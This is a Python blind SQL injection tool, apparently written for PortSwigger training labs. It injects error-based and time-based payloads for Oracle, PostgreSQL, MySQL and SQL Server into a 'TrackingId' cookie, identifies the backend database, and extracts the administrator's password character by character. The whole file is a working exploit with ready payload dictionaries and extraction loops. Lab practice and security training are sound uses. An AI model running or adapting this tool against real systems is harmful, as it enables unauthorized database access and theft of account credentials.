import requests as r
import argparse

# Configura argumentos
parser = argparse.ArgumentParser(description="Tool of BlindSQLi Error-Based and Time-Based. Work in some PortSwigger Lab's")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-c", "--cookie", required=True, help="Vulnerable Cookie")
parser.add_argument("-s", "--session", required=False, help="Session Token")
args = parser.parse_args()

# Definindo variáveis
url_target = args.url
cookie_value = args.cookie
user_token = args.session

# Identifica Banco de Dados e qual vulnerabilidade testar
def db_identify(http_session, url_target, cookie_value, user_token=None):
	
	# Payloads Error-Based para testar se o site é vulnerável ou não
	testes_error = {
	"Oracle":f"{cookie_value}' CTXSYS.DRITHSX.SN(1,'a')",
	"PostgreSQL":f"{cookie_value}' AND CAST('a' AS INT)",
	"MySQL":f"{cookie_value}' (SELECT 1 FROM (SELECT 1,2)x)",
	"Microsoft SQL Server":f"{cookie_value}' SELECT 1/0"
	}
	# Payloads Time-Based
	testes_time = {
	"Oracle":f"{cookie_value}'AND 1=dbms_pipe.receive_message(('a'),5)--",
	"PostgreSQL":f"{cookie_value}'||(SELECT pg_sleep(5))--",
	"MySQL":f"{cookie_value}' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
	"Microsoft SQL Server":f"{cookie_value}'; WAITFOR DELAY '0:0:5'--"
	}
	# Error-Based DB Identify
	print(f"\033[32m\n[*] Testing Error-Based Vulnerability\033[0m")
	for db_name, payload in testes_error.items():
		print(f"[*] Testing {db_name}...| (Error-Based)")
		current_cookie={'TrackingId': payload}
		if user_token:
			current_cookie['session'] = user_token
		
		try:
			response = http_session.get(url_target, cookies=current_cookie)
			if response.status_code == 500:
				print(f"\n\033[32m[+] Database Identified: {db_name} (Error-Based Vulnerable)\033[0m")
				return db_name, 'error-based'

		except Exception:
			pass
				# Time-Based DB Identify
	print("\033[32m\n[*] Testing Time-Based Vulnerability...\033[0m")				
	for db_name, payload in testes_time.items():
		print(f"[*] Testing {db_name}... | (Time-Based)")
		current_cookie={'TrackingId': payload}
		if user_token:
			current_cookie['session'] = user_token
		response = http_session.get(url_target, cookies=current_cookie, timeout=15) 
		if response.elapsed.total_seconds() >=5:
			print(f"\n\033[32m[+] Database Identified: {db_name} (Time-Based Vulnerable) \033[0m")
			return db_name, 'time-based'
		else:
			continue

# Extração de Senha
def extract_error(db_type, http_session, url_target, cookie_value, user_token=None):
	charset = 'abcdefghijklmnopqrstuvwxyz1234567890'
	extracted_pass=""

	queries_error = {
	"PostgreSQL": "{cookie}'1 = (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}') THEN 1/(SELECT 0) ELSE NULL END)",
	"MySQL": "{cookie}' AND (SELECT IF(SUBSTR(password,{i},1)='{char}', (SELECT 1 UNION SELECT 2), 1) FROM users WHERE username='administrator'))--",
	"Microsoft SQL Server": "{cookie}'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}') THEN 1/0 ELSE NULL END--",
	"Oracle": "{cookie}'||(SELECT CASE WHEN (SUBSTR(password,{i},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--"
	}

# Error-Based Extract Pass
	print("\n\033[32m[*] Extracting the Administrator Password...(Error-Based is more fast!)\033[0m")
	print(f"\n[*] Progress: ", end='', flush=True)
	
	try:
		for i in range(1, 21):
			found_char = False
			for char in charset:
				payload = queries_error[db_type].format(i=i, char=char, cookie=cookie_value)
				current_cookie = {'TrackingId': payload}
				if user_token:
					current_cookie['session'] = user_token
				response = http_session.get(url_target, cookies=current_cookie)
				if response.status_code == 500:
					extracted_pass += char
					found_char = True
					print(char, end='', flush=True)	
					break
			if not found_char:
				break
		print(f"\n\033[32m[+] Password: {extracted_pass}\033[0m")
	except Exception:
		print("\033[031m[!] Error\033[0m")
		exit()

# Time-Based Extract Pass
def extract_time(db_type, http_session, url_target, cookie_value, user_token=None):
	charset = "abcdefghijklmnopqrstuvwxyz1234567890"
	extracted_pass = ''
	queries_time = {
        	'PostgreSQL': f"{cookie_value}'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{{i}},1)='{{char}}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--",

        	'MySQL': f"{cookie_value}' AND (SELECT IF(SUBSTR(password,{{i}},1)='{{char}}', SLEEP(5), 0) FROM users WHERE username='administrator')-- ",

       		 'Microsoft SQL Server': f"{cookie_value}'; IF (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{{i}},1)='{{char}}') WAITFOR DELAY '0:0:5'--",

       		 'Oracle': f"{cookie_value}' AND (SELECT CASE WHEN (SUBSTR(password,{{i}},1)='{{char}}') THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM users WHERE username='administrator')--"
    }
	try:
		print("\n\033[32m[*] Extracting the Administrator Password...(Wait, Time-Based is slow.)\033[0m")
		print(f"\n[*] Progress: ", end='', flush=True)

		for i in range(1, 21):
			found_char = False
			for char in charset:
				payload = queries_time[db_type].format(i=i, char=char)
				current_cookie = {'TrackingId': payload}
				if user_token:
					current_cookie['session'] = user_token
				response = http_session.get(url_target, cookies=current_cookie, timeout=15)
				if response.elapsed.total_seconds() >= 5:
					extracted_pass += char
					found_char = True
					print(char, end='', flush=True)
					break
			if not found_char:
				break
		print(f"\n\033[32m[+] Password: {extracted_pass}\033[0m")
	except Exception as e:
		print("\033[31m[!] Error\033[0m")
		exit()



# Início
print("""
\033[32m
888888b.   888 d8b               888      .d8888b.   .d88888b.  888
888  "88b  888 Y8P               888     d88P  Y88b d88P" "Y88b 888
888  .88P  888                   888     Y88b.      888     888 888
8888888K.  888 888 88888b.   .d88888      "Y888b.   888     888 888
888  "Y88b 888 888 888 "88b d88" 888         "Y88b. 888     888 888
888    888 888 888 888  888 888  888            "888 888 Y8b 888 888
888   d88P 888 888 888  888 Y88b 888     Y88b  d88P Y88b.Y8b88P 888
8888888P"  888 888 888  888  "Y88888      "Y8888P"   "Y888888"  88888888
                                                              by acid\033[0m
""")

print(f"[+] Target URL: {url_target}")
print(f"[+] Cookie: {cookie_value}")
print(f"[+] Session Token: {user_token}")

# Cria uma sessão é verifica se foi estabelecida ou não
http_session = r.Session()
response = r.get(url_target)
if response.status_code == 200:
	print("\n[+] Conection Established!")
	db_name, vuln = db_identify(http_session, url_target, cookie_value, user_token)
	if db_name:
		if vuln == 'error-based':
			extract_error(db_name, http_session, url_target, cookie_value, user_token)
	if vuln == 'time-based':
		extract_time(db_name, http_session, url_target, cookie_value, user_token)
else:
	print("\033[31m[!] Error, conection not established.\033[0m")


